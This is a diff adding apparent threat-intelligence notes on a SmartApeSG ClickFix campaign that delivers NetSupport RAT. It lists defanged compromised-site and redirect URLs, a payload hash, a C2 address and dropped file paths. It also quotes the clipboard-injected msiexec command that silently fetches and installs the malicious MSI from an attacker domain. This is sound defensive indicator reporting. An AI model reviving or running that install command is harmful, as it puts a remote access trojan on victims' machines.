@@ -1,0 +1,55 @@
+2025-08-22 (FRIDAY): SMARTAPESG CLICKFIX FOR NETSUPPORT RAT
+
+NOTES:
+
+- Sometimes, SmartApeSG script injected into the compromised site leads directly to the JavaScript URL for the fake CAPTCHA page.
+- Other times, the injected script has a URL that redirects to the JavaScript URL for the fake CAPTCHA page.
+
+FROM COMPROMISED SITE TO SCRIPT FOR FAKE CAPTCHA PAGE EXAMPLE 1 (DIRECT):
+
+- hxxps[:]//mexicobusiness[.]news/
+- hxxps[:]//clouwave[.]net/ajax/pixi.min.js
+
+FROM COMPROMISED SITE TO SCRIPT FOR FAKE CAPTCHA PAGE EXAMPLE 2 (WITH REDIRECT):
+
+- hxxps[:]//myvocabulary[.]com/
+- hxxps[:]//myevmanual[.]com/d.js  <-- 302 found for next URL
+- hxxps[:]//clouwave[.]net/ajax/pixi.min.js
+
+EXAMPLE OF CLIPBOARD INJECTED SCRIPT FOR CLICKFIX STYLE INSTRUCTIONS:
+
+msiexec /i hxxps[:]//wwwjsnode[.]net/res/denynapkin /qn 251f6cb3=5856bc11_77af06a9*76617c2e_28f28c59_e7760cb0%d0dcb29d+f9a857a8
+
+RUNNING CLIPBOARD-INJECTED CLICKFIX SCRIPT:
+
+- hxxps[:]//wwwjsnode[.]net/res/denynapkin  <-- returned MSI file
+- hxxps[:]//wwwjsnode[.]net/vapor.o
+- hxxps[:]//wwwjsnode[.]net/assets/img/9952e53658b97e85.txt
+
+EXAMPLE OF MSI FILE FOR NETSUPPORT RAT RETRIEVED BY CLICKFIX SCRIPT:
+
+- SHA256 hash: 22a24ba1ab35914f9d6b70b3480c77e3f2c3fe32f3c84887dcbfe5faf054fc7a
+- File size: 17,657,856 bytes
+- Retreived from: hxxps[:]//wwwjsnode[.]net/res/denynapkin
+
+IP ADDRESS AND PORT NETSUPPORT RAT C2 TRAFFIC:
+
+- 194.37.97[.]139:443  <-- Unencrypted HTTP traffic with encrypted/encoded content
+
+NETSUPPORT RAT FILES ON AN INFECTED HOST:
+
+- C:\ProgramData\NT\atmfd.dll
+- C:\ProgramData\NT\client32.ini
+- C:\ProgramData\NT\client32u.ini
+- C:\ProgramData\NT\HTCTL32.DLL
+- C:\ProgramData\NT\msvcr100.dll
+- C:\ProgramData\NT\nskbfltr.inf
+- C:\ProgramData\NT\nsm_vpro.ini
+- C:\ProgramData\NT\NSM.ini
+- C:\ProgramData\NT\NSM.LIC
+- C:\ProgramData\NT\ntcache.exe
+- C:\ProgramData\NT\pcicapi.dll
+- C:\ProgramData\NT\PCICHEK.DLL
+- C:\ProgramData\NT\PCICL32.DLL
+- C:\ProgramData\NT\remcmdstub.exe
+- C:\ProgramData\NT\TCCTL32.DLL
